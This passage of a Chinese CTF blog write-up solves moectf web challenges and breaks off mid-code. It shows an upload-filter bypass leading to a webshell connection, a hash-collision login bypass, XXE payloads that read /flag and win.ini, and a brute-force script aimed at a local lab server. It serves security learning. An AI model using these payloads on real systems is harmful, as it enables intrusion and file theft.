+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$allowedExtensions</span> = [<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>] !== <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件类型不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filesize</span>(<span class="variable">$tmp_path</span>) &gt; <span class="number">512</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件太大&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileNameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploadFilePath</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$targetDir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_path</span>, <span class="variable">$uploadFilePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="variable">$uploadFilePath</span>]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件上传失败&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>这里判断的逻辑是</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileNameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
+<p>用’.’分隔，然后看第一个.后面是不是png，那就可以在后面在加php比如2.png.php<br>先是在浏览器直接上传，还是提示后缀问题，用bp改包发送就没问题了<br><img src="https://pic1.imgdb.cn/item/67bc9e46d0e0a243d403c4ea.png"><br>蚁剑连接，在根目录得到flag<br><img src="https://pic1.imgdb.cn/item/67bc9e8cd0e0a243d403c4f4.png"></p>
+<h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p><img src="https://pic1.imgdb.cn/item/67be7785d0e0a243d405d388.png"><br>下载题目源码<br>关键部分</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">int</span>.to_bytes(<span class="number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span>^<span class="number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="number">160</span>,<span class="string">&quot;big&quot;</span>,signed=<span class="literal">True</span>).decode().translate(&#123;<span class="built_in">ord</span>(c):<span class="literal">None</span> <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;\x00&quot;</span>&#125;)) <span class="comment"># what is it?</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data:<span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            data = base64.b64encode(data).decode() <span class="comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&quot;/login&quot;</span>:</span><br><span class="line">                body = <span class="variable language_">self</span>.rfile.read(<span class="built_in">int</span>(<span class="variable language_">self</span>.headers.get(<span class="string">&quot;Content-Length&quot;</span>)))</span><br><span class="line">                payload = json.loads(body)</span><br><span class="line">                params = json.loads(decrypt(payload[<span class="string">&quot;params&quot;</span>]))</span><br><span class="line">                <span class="built_in">print</span>(params)</span><br><span class="line">                <span class="keyword">if</span> params.get(<span class="string">&quot;username&quot;</span>) == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.send_response(<span class="number">403</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                    <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">if</span> params.get(<span class="string">&quot;username&quot;</span>) == params.get(<span class="string">&quot;password&quot;</span>):</span><br><span class="line">                    <span class="variable language_">self</span>.send_response(<span class="number">403</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                    <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;same&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                hashed = gethash(params.get(<span class="string">&quot;username&quot;</span>),params.get(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> k,v <span class="keyword">in</span> hashed_users.items():</span><br><span class="line">                    <span class="keyword">if</span> hashed == v:</span><br><span class="line">                        data = &#123;</span><br><span class="line">                            <span class="string">&quot;user&quot;</span>:k,</span><br><span class="line">                            <span class="string">&quot;hash&quot;</span>:hashed,</span><br><span class="line">                            <span class="string">&quot;flag&quot;</span>: FLAG <span class="keyword">if</span> k == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">                        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                        <span class="variable language_">self</span>.wfile.write(json.dumps(data).encode())</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">403</span>)</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;Invalid username or password&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">404</span>)</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;404 Not Found&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">500</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;500 Internal Server Error&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>这里通过post请求传递参数，而且需要用户名和密码一样，但是是一个弱比较，如果完全相等也不行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">print</span> (int.<span class="built_in">to_bytes</span>( <span class="number">0</span>x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164 ^<span class="number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="number">160</span>, <span class="string">&quot;big&quot;</span>, signed=True).<span class="built_in">decode</span>().<span class="built_in">translate</span>(&#123;<span class="built_in">ord</span>(c): None for c in <span class="string">&quot;\x00&quot;</span>&#125;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 输出</span><br><span class="line"><span class="selector-attr">[[0]</span> <span class="selector-tag">for</span> <span class="selector-tag">base64</span><span class="selector-class">.b64encode</span> <span class="selector-tag">in</span> <span class="selector-attr">[base64.b64decode]</span>]</span><br></pre></td></tr></table></figure></div>
+<p>前面eval语句执行的内容就是把base64 encode 变成decode ， decrepit函数就是把数据base64加密5次（但是前面因为encode变成decode了所以就是base64解码5次</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gethash</span>(<span class="params">*items</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        c ^= <span class="built_in">int</span>.from_bytes(hashlib.md5(<span class="string">f&quot;<span class="subst">&#123;salt&#125;</span>[<span class="subst">&#123;item&#125;</span>]<span class="subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="string">&quot;big&quot;</span>) <span class="comment"># it looks so complex! but is it safe enough?</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(c)[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure></div>
+<p>这个函数它会遍历每个参数，使用 MD5 哈希算法对每个参数进行哈希处理，然后将这些哈希值进行异或运算，最终返回异或结果的十六进制表示。然后最后去掉前两位就是0x<br>得到flag的部分</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hashed_users = <span class="built_in">dict</span>((k,<span class="built_in">gethash</span>(k,v)) <span class="keyword">for</span> k,v <span class="keyword">in</span> users<span class="selector-class">.items</span>())</span><br><span class="line">hashed = <span class="built_in">gethash</span>(params<span class="selector-class">.get</span>(<span class="string">&quot;username&quot;</span>),params<span class="selector-class">.get</span>(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> k,v <span class="keyword">in</span> hashed_users<span class="selector-class">.items</span>():</span><br><span class="line">                    <span class="keyword">if</span> hashed == v:</span><br><span class="line">                        data = &#123;</span><br><span class="line">                            <span class="string">&quot;user&quot;</span>:k,</span><br><span class="line">                            <span class="string">&quot;hash&quot;</span>:hashed,</span><br><span class="line">                            <span class="string">&quot;flag&quot;</span>: FLAG <span class="keyword">if</span> k == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        self<span class="selector-class">.send_response</span>(<span class="number">200</span>)</span><br><span class="line">                        self<span class="selector-class">.end_headers</span>()</span><br><span class="line">                        self<span class="selector-class">.wfile</span><span class="selector-class">.write</span>(json<span class="selector-class">.dumps</span>(data)<span class="selector-class">.encode</span>())</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">                        return</span><br></pre></td></tr></table></figure></div>
+<p>这里判断admin相等的是k，利用点就是这里hash加密使用的异或，异或的如果是两个相等的数，那就是0<br>而且使用的是弱比较，gethash用了int，所以数据类型不一样也会转化成int，所以一个username和passwd一个输入数字一个输入字符串就可以了  最后用base64编码5次后的数据传入</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="string">&#x27;&#123;&quot;username&quot; : &quot;1&quot; , &quot;password&quot; : 1&#125;&#x27;</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span> | <span class="built_in">base64</span></span><br><span class="line">VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3WVUxRWJIZFZWbVJ6Vkd4VmQySkhO</span><br><span class="line">VlZTVlRWRFdWWmtUMU5HU25WagpSM0JPVFd4SmVWZFVTWGhWYlVaV1lrVldhUXBOYlZKUFZqQlNR</span><br><span class="line">MVJGVG01UVZEQkxDZz09Cg==</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/67be8722d0e0a243d405d7eb.png"></p>
+<h1 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h1><p>打开容器，选择XDU moectf Flag  抓包<br><img src="https://pic1.imgdb.cn/item/67bece3dd0e0a243d405f9b9.png"><br>发现包里面用post发送了一个数据，用url解码得到xml格式的内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">xml_content</span>=%<span class="number">3</span>Cxml%<span class="number">3</span>E%<span class="number">3</span>Cname%<span class="number">3</span>EXDU+moeCTF+Flag%<span class="number">3</span>C%<span class="number">2</span>Fname%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fxml%<span class="number">3</span>E</span><br><span class="line"></span><br><span class="line"><span class="comment">#url解码后</span></span><br><span class="line"><span class="attribute">xml_content</span>=&lt;xml&gt;&lt;name&gt;XDU moeCTF Flag&lt;/name&gt;&lt;/xml&gt;</span><br></pre></td></tr></table></figure></div>
+<p>所以猜测要用xxe漏洞，xml的文档结构包括xml声明，dtd文档类型定义，以及文件元素 如：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。<br>这里能解析xml代码，我们可以写一个常见的payload，题目又说flag在根目录，所以可以猜测在&#x2F;flag<br>在外部实体里面也可以用php伪协议，这里就用伪协议读取数据<br>payload</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>这里最后的标签是用户可以随便选的,然后加上原来的<code>&lt;name&gt;</code><br><img src="https://pic1.imgdb.cn/item/67bed461d0e0a243d405fe71.png"><br>base64解码得到flag</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3Rme0RvX3kwdV9sMUtlX3RoRS14eGUtVnUxaFU2LXBIUF90MC1nRVRfRklBRy1BZnRFci1nQFNnYXNnYXMwfQo</span><br><span class="line">moectf&#123;Do_y0u_l1Ke_thE-xxe-Vu1hU6-pHP_t0-gET_FIAG-AftEr-<span class="selector-tag">g</span><span class="keyword">@Sgasgas0</span>&#125;</span><br></pre></td></tr></table></figure></div>
+<h1 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h1><p>这题因为环境关了，所以没做<br><img src="https://pic1.imgdb.cn/item/67bf311bd0e0a243d40647f3.png"></p>
+<h1 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h1><p>题目描述： 该死，之前的平行宇宙由于 flag 的泄露被一股神秘力量抹去，我们脱离了与那个宇宙的连接了！不过不用担心，看起来出题人傻乎乎的是具有泄露 flag 的概率的，我们只需要连接多个平行宇宙…（难道 flag 在多元宇宙里是全局变量吗）</p>
+<p><img src="https://pic1.imgdb.cn/item/67bef510d0e0a243d40613c4.png"><br>这里的意思就是flag存在&#x2F;id&#x3D;1 - 1000，当id为特定的值的时候可以得到flag<br>我们就可以写一个简单的脚本爆破出来</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:55898/&quot;</span><br><span class="line"><span class="keyword">session</span> = requests.<span class="keyword">session</span>()</span><br><span class="line"></span><br><span class="line">response = <span class="keyword">session</span>.<span class="keyword">get</span>(url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1001</span>):</span><br><span class="line">    <span class="type">text</span> = response.text</span><br><span class="line">    <span class="keyword">if</span> &quot;moectf&quot; <span class="keyword">in</span> <span class="type">text</span>:</span><br><span class="line">        print (<span class="type">text</span>)</span><br><span class="line">        break;</span><br><span class="line">    response = <span class="keyword">session</span>.<span class="keyword">get</span> (url + &quot;/?id=&quot; + str(i))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/67bef77bd0e0a243d40614ff.png"></p>
+<h1 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h1><p>题目</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Hanxin.exe.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Chant</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>] : <span class="string">&#x27;夺命十三枪&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_visitor</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="variable">$Chant</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$before</span> = <span class="title function_ 